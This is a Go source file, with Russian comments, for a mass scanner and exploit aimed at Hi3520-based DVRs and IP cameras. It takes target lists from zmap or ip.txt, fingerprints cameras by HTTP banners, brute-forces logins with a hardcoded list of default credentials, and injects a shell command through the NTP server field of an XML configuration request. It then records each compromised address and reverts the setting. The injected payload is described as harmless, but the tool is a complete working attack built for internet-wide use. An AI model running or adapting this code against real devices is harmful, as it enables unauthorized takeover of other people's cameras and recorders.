package main

import (
    "bufio"
    "encoding/base64"
    "fmt"
    "net"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"
)

// Start / go run main.go 80 /

// Potential exploits

// ip.txt {unknown, routers}

var statusAttempted, statusLogins, statusFound, statusVuln, statusClean int
var cntLen int = 292

var CONNECT_TIMEOUT = 60 * time.Second
var READ_TIMEOUT = 1200 * time.Second
var WRITE_TIMEOUT = 1200 * time.Second
var syncWait sync.WaitGroup
var cntLenString string
var vulnFile *os.File
var vulnMutex sync.Mutex

// Простой безопасный payload для тестирования (создает файл test.txt)
var payload string = "echo 'PWNED_BY_SCANNER' > /tmp/test_pwn.txt && echo SUCCESS"

// Расширенный список уязвимых путей
var paths = [...]string{
    "/dvr/cmd", "/cn/cmd", "/cgi-bin/hi3510/param.cgi", 
    "/device.rsp", "/system.xml", "/Security/users", 
    "/cgi-bin/configure.cgi", "/PSIA/Custom/SelfExt/userCheck",
    "/web/cgi-bin/hi3510/param.cgi", "/Security/AAA/users",
    "/ISAPI/Security/users", "/cgi-bin/main-cgi",
    "/config/global.cfg", "/form/", "/cgi-bin/snapshot.cgi",
}
var logins = [...]string{"root:icatch99", "root:1234", "report:8Jg0SR8K50", "admin:admin", "admin:123456", "root:123456", "admin:user", "admin:1234", "admin:password", "admin:12345", "admin:0000", "admin:1111", "admin:1234567890", "admin:123", "admin:", "admin:666666", "root:root", "admin:dvr", "root:dvr", "admin:000000", "admin:00000000", "888888:888888", "666666:666666", "service:service", "support:support", "root:pass", "root:camera", "admin:camera", "admin:9999", "Admin:123456", "administrator:", "admin:12345", "supervisor:supervisor", "admin:101101", "ubnt:ubnt", "admin:wbox", "root:ikwb", "admin:pass"}

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func saveVulnerableIP(target string) {
    vulnMutex.Lock()
    defer vulnMutex.Unlock()
    
    if vulnFile != nil {
        vulnFile.WriteString(target + "\n")
        vulnFile.Sync() // Принудительная запись на диск
    }
}

func setWriteTimeout(conn net.Conn, timeout time.Duration) {
    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
    conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func getStringInBetween(str string, start string, end string) (result string) {

    s := strings.Index(str, start)
    if s == -1 {
        return
    }

    s += len(start)
    e := strings.Index(str, end)

    if s > 0 && e > s+1 {
        return str[s:e]
    } else {
        return "null"
    }
}

func processTarget(target string) {
    defer syncWait.Done() // Всегда вызываем Done при выходе

    var authPos int = -1
    var pathPos int = -1

    statusAttempted++

    conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT)
    if err != nil {
        return
    }
    defer conn.Close()

    setWriteTimeout(conn, WRITE_TIMEOUT)
    conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Linux Gnu (cow)\r\nConnection: close\r\n\r\n"))

    setReadTimeout(conn, READ_TIMEOUT)
    bytebuf := make([]byte, 512)
    l, err := conn.Read(bytebuf)
    if err != nil || l <= 0 {
        zeroByte(bytebuf)
        conn.Close()
        return
    }

    response := string(bytebuf)
    
    // Расширенный фильтр для обнаружения уязвимых устройств
    if (strings.Contains(response, "401 Unauthorized") && strings.Contains(response, "Basic realm=")) ||
       (strings.Contains(response, "WWW-Authenticate: Basic")) ||
       (strings.Contains(response, "realm=\"DVR\"")) ||
       (strings.Contains(response, "realm=\"IPCamera\"")) ||
       (strings.Contains(response, "realm=\"Web View\"")) ||
       (strings.Contains(response, "Hi3520")) ||
       (strings.Contains(response, "DVR Platform")) ||
       (strings.Contains(response, "NetSurveillance")) ||
       (strings.Contains(response, "NETSDK")) ||
       (strings.Contains(response, "Embedded Web Server")) ||
       (strings.Contains(response, "DAHUA")) ||
       (strings.Contains(response, "Hikvision")) ||
       (strings.Contains(response, "realm=\"Login\"") && strings.Contains(response, "401")) {
        statusFound++
    } else {
        zeroByte(bytebuf)
        conn.Close()
        return
    }

    zeroByte(bytebuf)
    conn.Close()

    for i := 0; i < len(logins); i++ {

        conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
        if err != nil {
            break
        }

        setWriteTimeout(conn, WRITE_TIMEOUT)
        conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Linux Gnu (cow) \r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nAuthorization: Basic " + logins[i] + "\r\n\r\n"))

        setReadTimeout(conn, READ_TIMEOUT)
        bytebuf := make([]byte, 2048)
        l, err := conn.Read(bytebuf)
        if err != nil || l <= 0 {
            zeroByte(bytebuf)
            conn.Close()
            syncWait.Done()
            return
        }

        if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
            statusLogins++
            authPos = i
            zeroByte(bytebuf)
            conn.Close()
            break
        } else {
            zeroByte(bytebuf)
            continue
        }
    }

    if authPos == -1 {
        syncWait.Done()
        return
    }

    for i := 0; i < len(paths); i++ {

        conn, err = net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
        if err != nil {
            break
        }

        setWriteTimeout(conn, WRITE_TIMEOUT)
        conn.Write([]byte("POST " + paths[i] + " HTTP/1.1\r\nHost: " + target + "\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: " + cntLenString + "\r\nAuthorization: Basic " + logins[authPos] + "\r\nUser-Agent: Linux Gnu (cow) \r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov&" + payload + ";echo DONE\"/></Service></DVR>]]></SetConfiguration></DVR>\r\n\r\n"))

        // Убираем фиксированную задержку, используем таймауты

        setReadTimeout(conn, READ_TIMEOUT)
        bytebuf = make([]byte, 2048)
        l, err = conn.Read(bytebuf)
        if err != nil || l <= 0 {
            zeroByte(bytebuf)
            continue
        }

        if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
            pathPos = i
            zeroByte(bytebuf)
            conn.Close()
            statusVuln++
            // Сохраняем уязвимый IP в файл
            saveVulnerableIP(target)
            fmt.Printf("[VULN] Vulnerable target found: %s\n", target)
            break
        } else {
            zeroByte(bytebuf)
            continue
        }
    }

    if pathPos != -1 {

        conn, err = net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
        if err != nil {
            syncWait.Done()
            return
        }

        setWriteTimeout(conn, WRITE_TIMEOUT)
        conn.Write([]byte("POST " + paths[pathPos] + " HTTP/1.1\r\nHost: " + target + "\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: 281\r\nAuthorization: Basic " + logins[authPos] + "\r\nUser-Agent: Linux Gnu (cow) \r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov\"/></Service></DVR>]]></SetConfiguration></DVR>\r\n\r\n"))

        setReadTimeout(conn, READ_TIMEOUT)
        bytebuf = make([]byte, 2048)
        l, err = conn.Read(bytebuf)
        if err != nil || l <= 0 {
            zeroByte(bytebuf)
            conn.Close()
            return
        }

        if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
            statusClean++
        }

        zeroByte(bytebuf)
        conn.Close()
    }

    syncWait.Done()
    return

}

func main() {
  var i int = 0

  // кодировка логинов в base64
  for i = 0; i < len(logins); i++ {
    logins[i] = base64.StdEncoding.EncodeToString([]byte(logins[i]))
  }

  cntLen += len(payload)
  cntLenString = strconv.Itoa(cntLen)

  if len(os.Args) != 2 {
    fmt.Println("[Scanner] Missing argument (port/listen)")
    return
  }

  // Создаем файл для сохранения уязвимых IP
  var err error
  vulnFile, err = os.OpenFile("vulnerable.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
  if err != nil {
    fmt.Printf("[ERROR] Cannot create vulnerable.txt: %v\n", err)
    return
  }
  defer vulnFile.Close()
  fmt.Println("[INFO] Vulnerable IPs will be saved to vulnerable.txt")

  // статистика
  go func() {
    i = 0
    for {
      fmt.Printf("%d's | Total %d | Device Found: %d | Authenticated: %d | Payload Sent: %d | Cleaned Up: %d\r\n",
        i, statusAttempted, statusFound, statusLogins, statusVuln, statusClean)
      time.Sleep(1 * time.Second)
      i++
    }
  }()

  // Читаем IP адреса из stdin (zmap output) или файла ip.txt
  var scanner *bufio.Scanner
  
  // Проверяем есть ли данные в stdin
  stat, _ := os.Stdin.Stat()
  if (stat.Mode() & os.ModeCharDevice) == 0 {
    // Данные поступают из pipe (zmap)
    fmt.Println("[INFO] Reading targets from stdin (zmap output)...")
    scanner = bufio.NewScanner(os.Stdin)
  } else {
    // Читаем из файла ip.txt
    file, err := os.Open("ip.txt")
    if err != nil {
      fmt.Printf("[ERROR] Cannot open ip.txt: %v\n", err)
      fmt.Println("[INFO] Usage:")
      fmt.Println("  From zmap: zmap -p 8080 192.168.1.0/24 | go run main.go 8080")
      fmt.Println("  From file: go run main.go 8080 (requires ip.txt)")
      fmt.Println("")
      fmt.Println("[INFO] Example ip.txt:")
      fmt.Println("192.168.1.1")
      fmt.Println("10.0.0.1") 
      fmt.Println("172.16.0.1")
      return
    }
    defer file.Close()
    fmt.Println("[INFO] Reading targets from ip.txt...")
    scanner = bufio.NewScanner(file)
  }
  
  fmt.Println("[INFO] Starting scan...")

  for scanner.Scan() {
    line := strings.TrimSpace(scanner.Text())
    if line == "" {
      continue
    }

    // zmap выводит только IP, добавляем порт
    if os.Args[1] == "listen" {
      go processTarget(line)
    } else {
      go processTarget(line + ":" + os.Args[1])
    }
    syncWait.Add(1)
  }

  if err := scanner.Err(); err != nil {
    fmt.Printf("[ERROR] Reading input: %v\n", err)
  }

  syncWait.Wait() // ждём пока все горутины завершат работу
}

